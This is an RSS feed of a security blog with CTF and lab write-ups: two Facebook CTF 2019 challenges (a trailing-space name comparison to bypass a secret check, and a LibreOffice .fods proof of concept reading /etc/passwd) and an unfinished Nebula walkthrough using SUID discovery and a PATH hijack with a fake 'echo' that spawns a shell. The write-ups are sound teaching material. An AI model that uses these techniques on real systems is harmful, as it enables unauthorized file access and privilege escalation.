<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>💻 | Blog</title>
    <description>Hacking to learn, while learning to hack.
</description>
    <link>http://snoopysecurity.github.io/</link>
    <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 03 Feb 2020 22:46:06 +0000</pubDate>
    <lastBuildDate>Mon, 03 Feb 2020 22:46:06 +0000</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>Facebook CTF 2019: Products Manager Writeup</title>
        <description>&lt;p&gt;This challenge was part of &lt;a href=&quot;https://www.fbctf.com/&quot;&gt;Facebook CTF &lt;/a&gt;. Looking at the challenge tab, the following information is provided:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/7.png&quot; alt=&quot;alt text&quot; title=&quot;img7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the provided URL, this leads to the following web application where you can add and view your own products.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/8.png&quot; alt=&quot;alt text&quot; title=&quot;image9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the view products area shows the top 5 products within the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/10.png&quot; alt=&quot;alt text&quot; title=&quot;image10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To add a product, a secret needs to be created. After a product is added, this can be viewed and by submitting the product name and the secret. The source code the application is also provided for the challenge.&lt;/p&gt;

&lt;p&gt;index.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

require_once(&quot;db.php&quot;);

$products = get_top_products();

require_once(&quot;header.php&quot;);
?&amp;gt;

&amp;lt;p&amp;gt;
  &amp;lt;ul&amp;gt;
&amp;lt;?php
foreach ($products as $product) {
  echo &quot;&amp;lt;li&amp;gt;&quot; . htmlentities($product['name']) . &quot;&amp;lt;/li&amp;gt;&quot;;
}
?&amp;gt;
  &amp;lt;/ul&amp;gt;
&amp;lt;/p&amp;gt;

&amp;lt;?php require_once(&quot;footer.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;db.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
/*
CREATE TABLE products (
  name char(64),
  secret char(64),
  description varchar(250)
);

INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
*/
error_reporting(0);
require_once(&quot;config.php&quot;); // DB config

$db = new mysqli($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DBNAME);

if ($db-&amp;gt;connect_error) {
  die(&quot;Connection failed: &quot; . $db-&amp;gt;connect_error);
}

function check_errors($var) {
  if ($var === false) {
    die(&quot;Error. Please contact administrator.&quot;);
  }
}

function get_top_products() {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name FROM products LIMIT 5&quot;
  );
  check_errors($statement);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  $products = [];
  while ( ($product = $res-&amp;gt;fetch_assoc()) !== null) {
    array_push($products, $product);
  }
  $statement-&amp;gt;close();
  return $products;
}

function get_product($name) {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name, description FROM products WHERE name = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;s&quot;, $name);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  $product = $res-&amp;gt;fetch_assoc();
  $statement-&amp;gt;close();
  return $product;
}

function insert_product($name, $secret, $description) {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;INSERT INTO products (name, secret, description) VALUES
      (?, ?, ?)&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;sss&quot;, $name, $secret, $description);
  check_errors($statement-&amp;gt;execute());
  $statement-&amp;gt;close();
}

function check_name_secret($name, $secret) {
  global $db;
  $valid = false;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;ss&quot;, $name, $secret);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  if ($res-&amp;gt;fetch_assoc() !== null) {
    $valid = true;
  }
  $statement-&amp;gt;close();
  return $valid;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;view.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

require_once(&quot;db.php&quot;);
require_once(&quot;header.php&quot;);

function handle_post() {
  global $_POST;

  $name = $_POST[&quot;name&quot;];
  $secret = $_POST[&quot;secret&quot;];

  if (isset($name) &amp;amp;&amp;amp; $name !== &quot;&quot;
        &amp;amp;&amp;amp; isset($secret) &amp;amp;&amp;amp; $secret !== &quot;&quot;) {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return &quot;Incorrect name or secret, please try again&quot;;
    }

    $product = get_product($name);

    echo &quot;&amp;lt;p&amp;gt;Product details:&quot;;
    echo &quot;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&quot; . htmlentities($product['name']) . &quot;&amp;lt;/li&amp;gt;&quot;;
    echo &quot;&amp;lt;li&amp;gt;&quot; . htmlentities($product['description']) . &quot;&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;/p&amp;gt;&quot;;
  }

  return null;
}

$error = handle_post();
if ($error !== null) {
  echo &quot;&amp;lt;p&amp;gt;Error: &quot; . $error . &quot;&amp;lt;/p&amp;gt;&quot;;
}
?&amp;gt;
&amp;lt;form action=&quot;/view.php&quot; method=&quot;POST&quot;&amp;gt;
  Name: &amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  Secret: &amp;lt;input type=&quot;password&quot; name=&quot;secret&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  &amp;lt;input type=&quot;submit&quot; value=&quot;View&quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php require_once(&quot;footer.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;add.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

require_once(&quot;db.php&quot;);
require_once(&quot;header.php&quot;);

function validate_secret($secret) {
  if (strlen($secret) &amp;lt; 10) {
    return false;
  }
  $has_lowercase = false;
  $has_uppercase = false;
  $has_number = false;
  foreach (str_split($secret) as $ch) {
    if (ctype_lower($ch)) {
      $has_lowercase = true;
    } else if (ctype_upper($ch)) {
      $has_uppercase = true;
    } else if (is_numeric($ch)) {
      $has_number = true;
    }
  }
  return $has_lowercase &amp;amp;&amp;amp; $has_uppercase &amp;amp;&amp;amp; $has_number;
}

function handle_post() {
  global $_POST;

  $name = $_POST[&quot;name&quot;];
  $secret = $_POST[&quot;secret&quot;];
  $description = $_POST[&quot;description&quot;];

  if (isset($name) &amp;amp;&amp;amp; $name !== &quot;&quot;
        &amp;amp;&amp;amp; isset($secret) &amp;amp;&amp;amp; $secret !== &quot;&quot;
        &amp;amp;&amp;amp; isset($description) &amp;amp;&amp;amp; $description !== &quot;&quot;) {
    if (validate_secret($secret) === false) {
      return &quot;Invalid secret, please check requirements&quot;;
    }

    $product = get_product($name);
    if ($product !== null) {
      return &quot;Product name already exists, please enter again&quot;;
    }

    insert_product($name, hash('sha256', $secret), $description);

    echo &quot;&amp;lt;p&amp;gt;Product has been added&amp;lt;/p&amp;gt;&quot;;
  }

  return null;
}

$error = handle_post();
if ($error !== null) {
  echo &quot;&amp;lt;p&amp;gt;Error: &quot; . $error . &quot;&amp;lt;/p&amp;gt;&quot;;
}
?&amp;gt;
&amp;lt;form action=&quot;/add.php&quot; method=&quot;POST&quot;&amp;gt;
  Name of your product: &amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  Secret (10+ characters, smallcase, uppercase, number) : &amp;lt;input type=&quot;password&quot; name=&quot;secret&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  Description: &amp;lt;input type=&quot;text&quot; name=&quot;description&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  &amp;lt;input type=&quot;submit&quot; value=&quot;Add&quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php require_once(&quot;footer.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the comments, there is information regarding where the flag is hidden.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;It seems like the goal of this challenge is to read the description value of the facebook product. This could be possible through SQL injection or brute force of the secret value/field. Looking at the source code, prepared statements seems to be in use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;ss&quot;, $name, $secret);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Futhermore, the secret value is also hashed using SHA256 and compared to the one in the database. Looking at the source code, it also not possible to confuse the application by inserting the same product name since checks are in place.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    $product = get_product($name);
    if ($product !== null) {
      return &quot;Product name already exists, please enter again&quot;;
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However the following code looks like an entry point&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function get_product($name) {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name, description FROM products WHERE name = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;s&quot;, $name);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  $product = $res-&amp;gt;fetch_assoc();
  $statement-&amp;gt;close();
  return $product;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Tracing the code to where it is being called (see below), the following can be deduced.The &lt;code class=&quot;highlighter-rouge&quot;&gt;check_name_secret&lt;/code&gt; function checks if a product exists with the entered name and secret value. However, the &lt;code class=&quot;highlighter-rouge&quot;&gt;get_product function&lt;/code&gt; only returns one row from the database by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; parameter. As such, you could add another product called facebook with a secret and get the application program to return the first already creadted product found with the name facebook.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function handle_post() {
  global $_POST;

  $name = $_POST[&quot;name&quot;];
  $secret = $_POST[&quot;secret&quot;];

  if (isset($name) &amp;amp;&amp;amp; $name !== &quot;&quot;
        &amp;amp;&amp;amp; isset($secret) &amp;amp;&amp;amp; $secret !== &quot;&quot;) {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return &quot;Incorrect name or secret, please try again&quot;;
    }

    $product = get_product($name);

    echo &quot;&amp;lt;p&amp;gt;Product details:&quot;;
    echo &quot;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&quot; . htmlentities($product['name']) . &quot;&amp;lt;/li&amp;gt;&quot;;
    echo &quot;&amp;lt;li&amp;gt;&quot; . htmlentities($product['description']) . &quot;&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;/p&amp;gt;&quot;;
  }

  return null;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This vulnerability could be exploited using a vulnerability similiar to SQL Truncation Attack. This is due to MySQL comparing values within taking into account trailing spaces. Here we will enter a product with spaces e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;facebook&amp;lt;space&amp;gt;&lt;/code&gt; into the application which will be stored within the database. This will then become &lt;code class=&quot;highlighter-rouge&quot;&gt;facebook&lt;/code&gt; when we try to view the product again due to the comparison issue and we can view the facebook product to acquire our flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/11.png&quot; alt=&quot;alt text&quot; title=&quot;image11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The flag can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/12.png&quot; alt=&quot;alt text&quot; title=&quot;image12&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Jun 2019 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_product_manager.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_product_manager.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Facebook CTF 2019 : pdfme Writeup</title>
        <description>&lt;p&gt;This challenge was part of &lt;a href=&quot;https://www.fbctf.com/&quot;&gt;Facebook CTF &lt;/a&gt;. Looking at the challenge tab, the following information is provided:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/1.png&quot; alt=&quot;alt text&quot; title=&quot;challengearea&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The goal of this challenge is the exploit the PDF conversion service seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/2.png&quot; alt=&quot;alt text&quot; title=&quot;image2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the upload page, a file with &lt;code class=&quot;highlighter-rouge&quot;&gt;.fods&lt;/code&gt; extension can be uploaded. This extension corresponds to the OpenDocument Spreadsheet format: &lt;a href=&quot;http://fileformats.archiveteam.org/wiki/OpenDocument_Spreadsheet&quot;&gt;OpenDocument_Spreadsheet Fileformat&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets try to see if we can fake and extension and what result gets uploaded.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;Hello World&quot; &amp;gt; test.fods
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Uploading the above file was successful and a PDF was generated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/3.png&quot; alt=&quot;alt text&quot; title=&quot;image3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Examining the metadata of the produced PDF tells us the LibreOffice 6.0 is used for conversion of the &lt;code class=&quot;highlighter-rouge&quot;&gt;.fods&lt;/code&gt; file by the application.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sams@sams-snyk:~$ exiftool 1.pdf 
ExifTool Version Number         : 10.80
File Name                       : 1.pdf
Directory                       : .
File Size                       : 7.2 kB
File Modification Date/Time     : 2019:06:07 23:46:55+01:00
File Access Date/Time           : 2019:06:07 23:47:00+01:00
File Inode Change Date/Time     : 2019:06:07 23:47:00+01:00
File Permissions                : rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Creator                         : Writer
Producer                        : LibreOffice 6.0
Create Date                     : 2019:06:07 22:46:45Z

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This shows us that the web application is converting the  file to a PDF using LibreOffice 6.0 Calc. By searching exploit-db for relevant vulnerabilities, the following exploit looks probable to work - &lt;a href=&quot;https://www.exploit-db.com/exploits/44022&quot;&gt;www.exploit-db.com/exploits/44022&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The author also provided a GitHub Repository where the PoC code can be downloaded: &lt;a href=&quot;https://raw.githubusercontent.com/jollheef/libreoffice-remote-arbitrary-file-disclosure/master/poc.fods&quot;&gt;poc.fods&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The proof of concept code can be used to read the passwd file within the application’s hosted linux system. Uploading the provided PoC and looking at the created PDF, you can see the passwd file on the system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/4.png&quot; alt=&quot;alt text&quot; title=&quot;image4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieval of the passwd file tells us that the home directory of the &lt;code class=&quot;highlighter-rouge&quot;&gt;libreoffice_admin user&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/libreoffice_admin&lt;/code&gt;. After multiple attempts, the flag was found to be within the follow directory path: &lt;code class=&quot;highlighter-rouge&quot;&gt;home/libreoffice_admin/flag&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/6.png&quot; alt=&quot;alt text&quot; title=&quot;image6&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Jun 2019 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_pdfme.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_pdfme.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Exploit Education - Nebula Walkthrough</title>
        <description>&lt;p&gt;This blog post contains a walkthrough of Nebula provided by  &lt;a href=&quot;https://exploit.education&quot;&gt;Exploit Education&lt;/a&gt;. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation vulnerabilities. Some of these vulnerabilties includes issues such as SUID files, Permissions, Race conditions etc.&lt;/p&gt;

&lt;p&gt;After running the ISO, each level can be accessed by sshing into port 22 with the username &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;levelno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;. Instructions regarding each level are also provided within https://exploit.education/nebula/.&lt;/p&gt;

&lt;h2 id=&quot;level00&quot;&gt;Level00&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-00/&quot;&gt;Link: https://exploit.education/nebula/level-00/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The goal of this level is to find a Set User ID program that will run as the “flag00” account. SetUID, which stands for set user ID on execution, is a special type of file permission in Unix which permits users to run certain programs with escalated privileges.&lt;/p&gt;

&lt;p&gt;In Unix/Linux, the ownership of files and directories is based on the default uid (user-id) and gid (group-id) of the user who created them. When running a program/process within Linux, this process/program has the privilege of the user that ran the program. A SetUID bit can be set on an executable which when executed, will then run under the context of the file owner rather than the user who ran the program. For example, if an executable has the setuid bit set on it, and it’s owned by root, when launched by a normal user, it will run with root privileges.&lt;/p&gt;

&lt;p&gt;To find all SetUID binaries within a system, the the find command can be used with the following arguments:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -perm -u=s 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; argument is specified to run the command from the top most directory, the &lt;code class=&quot;highlighter-rouge&quot;&gt;-perm&lt;/code&gt; option can be used to find files with specific mode. Files with SetUID and SetGID all have different mode numbers. For example,  &lt;code class=&quot;highlighter-rouge&quot;&gt;g=w&lt;/code&gt; will only match files which have mode &lt;code class=&quot;highlighter-rouge&quot;&gt;0020&lt;/code&gt; since this is the mode number for files with group write permission set. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-u=s&lt;/code&gt; can be used to find files with the mode SetUID set. The &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/.../flag00&lt;/code&gt; is provided to ignore all stdout errors by sending them to &lt;code class=&quot;highlighter-rouge&quot;&gt;dev/null&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level00@nebula:~$ find / -perm -u=s 2&amp;gt;/dev/null
/bin/.../flag00
/bin/fusermount
/bin/mount
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/sbin/mount.ecryptfs_private
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/sbin/pppd
/usr/sbin/uuidd
/rofs/bin/.../flag00
/rofs/bin/fusermount
/rofs/bin/mount
/rofs/bin/ping
/rofs/bin/ping6
/rofs/bin/su
/rofs/bin/umount
/rofs/sbin/mount.ecryptfs_private
/rofs/usr/bin/at
/rofs/usr/bin/chfn
/rofs/usr/bin/chsh
/rofs/usr/bin/gpasswd
/rofs/usr/bin/mtr
/rofs/usr/bin/newgrp
/rofs/usr/bin/passwd
/rofs/usr/bin/sudo
/rofs/usr/bin/sudoedit
/rofs/usr/bin/traceroute6.iputils
/rofs/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/rofs/usr/lib/eject/dmcrypt-get-device
/rofs/usr/lib/openssh/ssh-keysign
/rofs/usr/lib/pt_chown
/rofs/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/rofs/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/rofs/usr/sbin/pppd
/rofs/usr/sbin/uuidd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/.../flag00&lt;/code&gt; binary can now be run to get the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula001.png&quot; alt=&quot;alt text&quot; title=&quot;image1&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level01&quot;&gt;Level01&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-01/&quot;&gt;Link: https://exploit.education/nebula/level-01/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level01 provides you with source code of a program that allows arbitrary programs to be executed.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&quot;/usr/bin/env echo and now what?&quot;);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Running the binary within the flag01 folder gives the following output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level01@nebula:~$ cd ../flag01
level01@nebula:/home/flag01$ ./flag01 
and now what?
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;ltrace can be used to debug this binary and understand its functionality. ltrace is a debugging utility which hooks into the dynamic loading system, allowing it to insert shims which display the parameters which the applications uses when making the call, and the return value which the library call reports. It is mainly used to trace Linux system calls.&lt;/p&gt;

&lt;p&gt;The ltrace output below just explains the source in a functional way where it takes the current uid and gid of the user who executed the binary and&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level01@nebula:/home/flag01$ ltrace ./flag01 
level01@nebula:/home/flag01$ id
uid=1002(level01) gid=1002(level01) groups=1002(level01)
__libc_start_main(0x80484a4, 1, 0xbfc49744, 0x8048510, 0x8048580 &amp;lt;unfinished ...&amp;gt;
getegid()                                                        = 1002
geteuid()                                                        = 1002
setresgid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0
setresuid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0
system(&quot;/usr/bin/env echo and now what?&quot;and now what?
 &amp;lt;unfinished ...&amp;gt;
--- SIGCHLD (Child exited) ---
&amp;lt;... system resumed&amp;gt; )                                           = 0
+++ exited (status 0) +++
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Looking at the system call it makes, it is possible to change the path of the echo binary since it is relying on &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/env&lt;/code&gt; to find the full path of the &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; binary. The &lt;code class=&quot;highlighter-rouge&quot;&gt;env&lt;/code&gt; can be run to see what the PATH environment of a user is, generally it is something like &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games&lt;/code&gt;. This output is the list of folders that system checks when a user runs a binary without providing its full path.&lt;/p&gt;

&lt;p&gt;So complete this challenge, you can change your PATH to be called from an folder that you have write access to such as &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/level01/&lt;/code&gt;, and then create a new binary call echo, or a symbolic link which will then execute the getflag binary.&lt;/p&gt;

&lt;p&gt;Start by creating a file called echo.c within the tmp directory or a directory you have write and execute privileges to and paste the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;

int main()
{
  system(&quot;/bin/bash&quot;);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This can then be compiled into a program as seen below.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level01@nebula:/tmp$ vi echo.c
level01@nebula:/tmp$ cc echo.c -o echo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once you have a dummy echo program, you can then change your environment path to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory, meaning everytime the system will check if a binary is within the tmp folder since it doesn’t know the full path. Now when running the flag01 binary this will run the dummy echo program and provide you a bash shell under the context of the flag01 user account. Then the &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; command can be executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula01.png&quot; alt=&quot;alt text&quot; title=&quot;image1&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level02&quot;&gt;Level02&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-02/&quot;&gt;Link: https://exploit.education/nebula/level-02/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level 02 provides you with a program which takes a USER from an environment variable using &lt;code class=&quot;highlighter-rouge&quot;&gt;asprintf&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;asprint&lt;/code&gt; is similar to &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;, except that it dynamically allocates a string to hold the output, instead of putting the output in a buffer you allocate in advance. This is then given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; function which invokes an operating system command with the provider “USER” variable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

